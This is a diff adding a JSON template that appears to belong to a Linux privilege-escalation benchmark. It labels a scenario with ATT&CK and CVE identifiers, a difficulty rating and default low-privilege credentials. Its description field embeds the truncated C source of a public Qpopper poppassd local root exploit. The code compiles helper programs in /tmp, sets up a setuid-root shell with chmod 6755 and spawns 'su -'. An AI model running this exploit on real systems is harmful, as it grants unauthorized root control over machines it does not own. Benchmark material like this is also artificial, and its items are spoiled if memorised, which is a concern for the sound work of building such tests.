@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Qpopper 4.0.x - 'poppassd' Privilege Escalation (OSVDB-60330;CVE-2003-1452)\n\nExploit source code (21.c):\n```\n/*\n**\n**  Title: Qpopper v4.0.x poppassd local root exploit.\n**  Exploit code: 0x82-Local.Qp0ppa55d.c\n**\n** --\n**  ./0x82-Local.Qp0ppa55d -u x82 -p mypasswd\n**\n**  Qpopper v4.0.x poppassd local root exploit.\n**                          by Xpl017Elz\n**\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/stat.h>\n\n#define BUF_SZ 0x82\n#define D_POPPASS \"/usr/local/bin/poppassd\"\n#define D_NAME \"Happy-Exploit\"\n#define D_SHELL \"/tmp/x82\"\n#define D_EXEC \"/tmp/x0x\"\n\nint m_sh();\nvoid banrl();\nvoid usage(char *p_name);\nstruct stat ss;\n\nvoid usage(char *p_name)\n{\n\tfprintf(stdout,\" Usage: %s -option [argument]\\n\",p_name);\n\tfprintf(stdout,\"\\n\\t-u - Qpopper username.\\n\");\n\tfprintf(stdout,\"\\t-p - Qpopper password.\\n\");\n\tfprintf(stdout,\"\\t-t - Qpopper poppassd path.\\n\");\n\tfprintf(stdout,\"\\t-h - Help information.\\n\\n\");\n\tfprintf(stdout,\" Example> %s -u x82 -p %s\\n\\n\",p_name,D_NAME);\n\texit(-1);\n}\n\nint m_sh()\n{\n\tchar d_shell[BUF_SZ]=D_SHELL;\n\tchar sh_drop[BUF_SZ];\n\tFILE *fp;\n\n\tmemset((char *)sh_drop,0,sizeof(sh_drop));\n\tsnprintf(sh_drop,sizeof(sh_drop)-1,\"%s.c\",d_shell);\n\n\tif((fp=fopen(sh_drop,\"w\"))==NULL)\n\t{\n\t\tperror(\" [-] fopen() error\");\n\t\texit(-1);\n\t}\n\n\tfprintf(fp,\"main() {\\n\");\n\tfprintf(fp,\"setreuid(0,0);\\nsetregid(0,0);\\n\");\n\tfprintf(fp,\"setuid(0);\\nsetgid(0);\\n\");\n\tfprintf(fp,\"system(\\\"su -\\\");\\n}\\n\");\n\n\tfclose(fp);\n\n\tmemset((char *)sh_drop,0,sizeof(sh_drop));\n\tsnprintf(sh_drop,sizeof(sh_drop)-1,\n\t\t\"gcc -o %s %s.c >/dev/null 2>&1;\"\n\t\t\"rm -f %s.c >/dev/null 2>&1\",\n\t\td_shell,d_shell,d_shell);\n\tsystem(sh_drop);\n\n\tmemset((char *)d_shell,0,sizeof(d_shell));\n\tstrncpy(d_shell,D_EXEC,sizeof(d_shell)-1);\n\n\tmemset((char *)sh_drop,0,sizeof(sh_drop));\n\tsnprintf(sh_drop,sizeof(sh_drop)-1,\"%s.c\",d_shell);\n\n\tif((fp=fopen(sh_drop,\"w\"))==NULL)\n\t{\n\t\tperror(\" [-] fopen() error\");\n\t\texit(-1);\n\t}\n\n\tfprintf(fp,\"main() {\\n\");\n\tfprintf(fp,\"setreuid(0,0);\\nsetregid(0,0);\\n\");\n\tfprintf(fp,\"setuid(0);\\nsetgid(0);\\n\");\n\tfprintf(fp,\"system(\\\"chown root: %s\\\");\\n\",D_SHELL);\n\tfprintf(fp,\"system(\\\"chmod 6755 %s\\\");\\n}\\n\",D_SHELL);\n\n\tfclose(fp);\n\n\tmemset((char *)sh_drop,0,sizeof(sh_drop));\n\tsnprintf(sh_drop,sizeof(sh_drop)-1,\n\t\t\"gcc -o %s %s.c >/dev/null 2>&1;\"\n\t\t\"rm -f %s.c >/dev/null 2>&1\",\n\t\td_shell,d_shell,d_shell);\n\tsystem(sh_drop);\n\n\tif((stat(D_SHELL,&ss)==0)&&(stat(D_EXEC,&ss)==0))\n\t{\n\t\tfprintf(stdout,\" [+] make code.\\n\");\n\t\treturn(0);\n\t}\n\telse\n\t{\n\t\tfprintf(stderr,\" [-] code not found.\\n\");\n\t\treturn(-1);\n\t}\n}\n\nint main(int argc, char *argv[])\n{\n\tint whtl;\n\tchar user_id[BUF_SZ]=D_NAME;\n\tchar passwd[BUF_SZ]=D_NAME;\n\tchar tg_path[BUF_SZ]=D_POPPASS;\n\tchar df_sh[BUF_SZ]=D_SHELL;\n\n\t(void)banrl();\n\n\twhile((whtl=getopt(argc,argv,\"U:u:P:p:T:t:Hh\"))!=-1)\n\t{\n\t\textern char *optarg;\n\t\tswitch(whtl)\n\t\t{\n\t\t\tcase 'U':\n\t\t\tcase 'u':\n\t\t\t\tmemset((char *)user_id,0,sizeof(user_id));\n\t\t\t\tstrncpy(user_id,optarg,sizeof(user_id)-1);\n\t\t\t\tbreak;\n\n\t\t\tcase 'P':\n\t\t\tcase 'p':\n\t\t\t\tmemset((char *)passwd,0,sizeof(passwd));\n\t\t\t\tstrncpy(passwd,optarg,sizeof(passwd)-1);\n\t\t\t\tbreak;\n\n\t\t\tcase 'T':\n\t\t\t\n```",
+  "cve": "OSVDB-60330;CVE-2003-1452",
+  "exploitdb_id": "21",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
